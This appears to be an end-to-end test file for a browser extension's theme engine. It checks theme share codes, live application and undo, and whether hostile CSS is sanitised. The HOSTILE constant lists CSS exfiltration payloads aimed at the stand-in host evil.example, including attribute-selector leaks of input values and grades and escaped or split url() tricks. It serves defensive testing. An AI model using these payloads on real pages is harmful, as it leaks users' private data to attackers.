// theme engine e2e (src/core/theme): a theme from a share code applies live on
// the mock and Undo restores; a full rice with hostile CSS applies only its
// safe part, and the real browser makes no request to the attacker.
// The engine runs in the extension's service worker (bundled here with esbuild),
// writing through the same store the Studio will use.
import * as esbuild from 'esbuild';
import path from 'node:path';
import type { Page, Worker } from '@playwright/test';
import { test, expect, CANVAS } from './fixtures.ts';

const DEV = path.resolve(import.meta.dirname, '../..');
let engine = '';

test.beforeAll(async () => {
  const r = await esbuild.build({
    stdin: { contents: "export * from './src/core/theme/index.ts'; export { createStore } from './src/core/settings/store.ts';", resolveDir: DEV, loader: 'ts' },
    bundle: true, format: 'iife', globalName: '__b2cTheme', write: false, platform: 'browser', target: 'chrome120', loader: { '.css': 'text' },
  });
  engine = r.outputFiles[0]!.text;
});

/** Load the engine into the service worker (Runtime.evaluate, not eval: no CSP issue). */
async function withEngine(sw: Worker) {
  await sw.evaluate(engine);
}

const bodyBg = (p: Page) => p.evaluate(() => getComputedStyle(document.body).backgroundColor);
const rgb = (hex: string) => `rgb(${[1, 3, 5].map(i => parseInt(hex.slice(i, i + 2), 16)).join(', ')})`;

test('theme: a light theme from a share code restyles Canvas live, and Undo restores it', async ({ context, sw, setSettings }) => {
  await setSettings({ 'palette.useDark': 'never' }); // so the Light slot is what shows
  const page = await context.newPage();
  await page.addInitScript(() => localStorage.setItem('b2c_now', '2026-10-21T10:00:00-07:00'));
  await page.goto(CANVAS + '/');
  await expect(page.locator('html')).toHaveAttribute('data-b2c-instance', /.+/);
  const card = page.locator('.ic-DashboardCard').first();
  await expect(card).toBeAttached();
  const canvasBg = await bodyBg(page);
  const canvasRadius = await card.evaluate(el => getComputedStyle(el).borderTopLeftRadius);

  await withEngine(sw);
  const result = await sw.evaluate(async () => {
    const T = (globalThis as any).__b2cTheme;
    const theme = { ...T.preset('solarized-light'), name: 'Solarized, rounded', shape: { corner: 12 } };
    const code: string = await T.encodeShare(theme);
    const imported = await T.importText(code);
    const schema = (await (await fetch(chrome.runtime.getURL('schema.json'))).json()).settings;
    const store = T.createStore(schema);
    (globalThis as any).__applied = await T.apply(store, imported.theme);
    return { code, errors: imported.errors, bg: imported.theme.palette.light.bg as string, values: (globalThis as any).__applied.plan.values };
  });
  expect(result.code).toMatch(/^b2c-theme:[A-Za-z0-9_-]+$/);
  expect(result.code.length).toBeLessThan(1024);
  expect(result.errors).toEqual([]);
  expect(result.values).toMatchObject({ 'palette.light': 'custom', 'shape.corner': 12 });

  // Live, no reload: the light slot paints and corners change.
  await expect(page.locator('html')).toHaveAttribute('data-b2c-theme', 'on');
  await expect(page.locator('html')).toHaveAttribute('data-b2c-scheme', 'light');
  await expect.poll(() => bodyBg(page)).toBe(rgb(result.bg));
  await expect.poll(() => card.evaluate(el => getComputedStyle(el).borderTopLeftRadius)).toBe('12px');

  // Undo: every trace of the theme is gone, still without a reload.
  expect(await sw.evaluate(() => (globalThis as any).__applied.undo())).toBe(true);
  await expect(page.locator('html')).not.toHaveAttribute('data-b2c-theme', /.*/);
  await expect.poll(() => bodyBg(page)).toBe(canvasBg);
  await expect.poll(() => card.evaluate(el => getComputedStyle(el).borderTopLeftRadius)).toBe(canvasRadius);
});

const HOSTILE = `
.ic-DashboardCard { outline: 3px solid rgb(1, 2, 3); }
input[value^="a"] { background: url(https://evil.example/value-a); }
[data-grade^="9"] { background-image: url(//evil.example/grade-9); }
.probe { background: u\\rl(https://evil.example/escaped); }
.probe { background: url/**/(https://evil.example/split); }
.probe { cursor: url(https://evil.example/cursor.cur), auto; }
.probe { background: image-set("https://evil.example/set.png" 1x); }
.probe { background: -webkit-image-set(url(https://evil.example/wset.png) 1x); }
@import url(https://evil.example/import.css);
@font-face { font-family: Probe; src: url(https://evil.example/font.woff2); }
.probe { font-family: Probe; }
.probe::before { content: "x"; background: url("data:image/gif;base64,R0lGODlhAQABAAAAACw="); }
`;

const evilRequests = (context: import('@playwright/test').BrowserContext) => {
  const seen: string[] = [];
  context.on('request', r => { if (r.url().includes('evil.example')) seen.push(r.url()); });
  return seen;
};

const addProbes = (p: Page) => p.evaluate(() => {
  const box = document.createElement('div');
  box.innerHTML = '<input value="abc"><div data-grade="95">95</div><div class="probe">probe</div>';
  document.body.append(box);
});

test('theme: a rice code with hostile CSS applies only the safe part; the browser asks the attacker for nothing', async ({ context, sw }) => {
  const seen = evilRequests(context);
  const page = await context.newPage();
  await page.addInitScript(() => localStorage.setItem('b2c_now', '2026-10-21T10:00:00-07:00'));
  await page.goto(CANVAS + '/');
  await expect(page.locator('html')).toHaveAttribute('data-b2c-instance', /.+/);
  await addProbes(page);

  await withEngine(sw);
  const r = await sw.evaluate(async (css: string) => {
    const T = (globalThis as any).__b2cTheme;
    const rice: string = await T.encodeShare({ $b2c: 'theme', v: 1, name: 'Hostile', css }, 'rice');
    const plain: string = await T.encodeShare({ $b2c: 'theme', v: 1, name: 'Hostile', css });
    const imported = await T.importText(rice);
    const viaThemeCode = await T.importText(plain);
    const schema = (await (await fetch(chrome.runtime.getURL('schema.json'))).json()).settings;
    const store = T.createStore(schema);
    const without = T.plan(imported.theme, await store.load());
    await T.apply(store, imported.theme, { css: true });
    return {
      rice: rice.slice(0, 9), kept: imported.theme.css as string, removed: imported.cssRemoved.length as number,
      themeCodeCss: viaThemeCode.theme.css ?? null, consent: without.notes.map((n: { kind: string }) => n.kind),
    };
  }, HOSTILE);
  expect(r.rice).toBe('b2c-rice:');
  expect(r.themeCodeCss).toBeNull(); // a plain theme code never carries CSS
  expect(r.consent).toContain('consent'); // CSS needs a yes
  expect(r.kept).not.toContain('evil');
  expect(r.removed).toBeGreaterThanOrEqual(9);

  // The safe part applies live through custom-css…
  const card = page.locator('.ic-DashboardCard').first();
  await expect.poll(() => card.evaluate(el => getComputedStyle(el).outlineColor)).toBe('rgb(1, 2, 3)');
  // …and Chromium's own parse of what's on the page holds no remote URL.
  const urls = await page.evaluate(() => {
    const out: string[] = [];
    const walk = (rules: CSSRuleList) => {
      for (const rule of Array.from(rules)) {
        for (const m of rule.cssText.matchAll(/url\(\s*["']?([^"')]*)/gi)) out.push(m[1]!);
        if ('cssRules' in rule) walk((rule as CSSGroupingRule).cssRules);
      }
    };
    const el = document.querySelector<HTMLStyleElement>('style[data-b2c-custom-css]');
    if (el?.sheet) walk(el.sheet.cssRules);
    return { found: !!el?.sheet, urls: out };
  });
  expect(urls.found).toBe(true);
  for (const u of urls.urls) expect(u).toMatch(/^data:/);

  // Give the page every chance to fetch: probes match, fonts resolve, layout settles.
  await addProbes(page);
  await page.evaluate(() => document.fonts.ready);
  await page.waitForTimeout(800);
  expect(seen).toEqual([]);

  // Control: the same CSS unsanitised does reach out, so the probe above would have seen it.
  await page.evaluate(css => { const s = document.createElement('style'); s.textContent = css; document.head.append(s); }, HOSTILE);
  await expect.poll(() => seen.length, { timeout: 5000 }).toBeGreaterThan(0);
});
